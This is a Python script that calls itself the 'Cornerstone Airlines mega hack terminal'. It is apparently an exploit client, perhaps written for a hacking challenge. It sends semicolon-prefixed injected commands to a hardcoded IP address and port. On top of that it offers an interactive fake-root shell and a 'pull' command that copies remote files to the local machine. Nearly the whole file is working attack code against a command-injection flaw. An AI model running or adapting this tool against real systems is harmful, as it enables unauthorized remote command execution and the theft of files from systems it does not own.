#!/usr/bin/python3

import socket
import sys
import fileinput
import os

def recvall_bytes(socket):
    response = bytes("", 'UTF-8')
    while(True):
        s = socket.recv(1024)
        if len(s) == 0:
            break
        response = response + s
    return response

def recvall(socket):
    s = ""
    response = ""
    while(True):
        s = socket.recv(1024)
        if len(s) == 0:
            break
        response = response + s.decode("utf-8") 
    return response

def send_command(command):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("142.93.118.186", 45))
    s.recv(781)

    # Close stdin and redirect stderr to stdout
    s.send(bytes(";" + command + " 0<&- 2>&1\n", 'UTF-8'))
    return recvall(s)

def send_command_bytes(command):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("142.93.118.186", 45))
    s.recv(781)

    # Close stdin and redirect stderr to stdout
    s.send(bytes(";" + command + " 0<&- 2>&1\n", 'UTF-8'))
    return recvall_bytes(s)

def send_command_with_path(command, path):
    return send_command("(cd " + path + "; " + command + ")")

def is_directory(dir):
    output = send_command("cd " + dir)
    return "No such file or directory" not in output

def is_file(file):
    output = send_command("(ls " + file + " && echo yes) || echo no")
    return "yes" in output

def prompt(path):
    sys.stdout.write("root@cornerstoneairlines.co:" + path + "# ")
    sys.stdout.flush()

# Note: I am aware that my shell has a sort of command injection vulnerability.
# Try running the following:

# > cd; echo "Hello, World!"
# > ls
# Hello World! ...

def shell():
    path = "/"
    prompt(path)

    for line in sys.stdin:
        command = line.replace("\n", "").lstrip()

        if command.startswith("cd "):
            path_part = command.split("cd", 1)[1].lstrip()
            if path_part.startswith("/"):
                if is_directory(path_part):
                    path = path_part
                else:
                    print("cd: " + path_part + ": No such file or directory")
            else:
                temp_path = os.path.abspath(os.path.join(path, path_part))
                if is_directory(temp_path):
                    path = temp_path
                else:
                    print("cd: " + temp_path + ": No such file or directory")
        elif command.rstrip() == "exit":
            break
        else:
            output = send_command_with_path(command, path)
            sys.stdout.write(output.replace("/opt/container_startup.sh: line 29: ", ""))
        
        prompt(path) 

def pull(remote, local):


    if not is_file(remote):
        print("Remote file does not exist")
    else:
        response = send_command_bytes("cat " + remote)

        try:
            f = open(local, "wb")
            f.write(response)
        except: 
            print("Error writing to local file: " + local)

def pull_get_input(command):

    try: 
        without_pull = command.split("pull", 1)[1].lstrip()
        remote = without_pull.split(" ", 1)[0]
        local = without_pull.split(" ", 1)[1].lstrip()
        pull(remote, local)
    except:
        print("Usage: pull <remote path> <local path>")

def print_help():
    print("Commands: ")
    print("'quit' - Exit the program")
    print("'help' - Display this meesage")
    print("'shell' - Open interactive shell")
    print("'pull <remote path> <local path>' - Copy remote file to local machine")
    
print("Welcome to the Cornerstone Airlines mega hack terminal.")
print("Enter 'help' for a list of commands.")

for line in sys.stdin:
    command = line.strip()

    if command == "shell":
        shell()
    elif command.startswith("pull"):
        pull_get_input(command)
    elif command == "help":
        print_help()
    elif command  == "quit":
        break
    else:
        print("Invalid command. Type 'help' for more information.")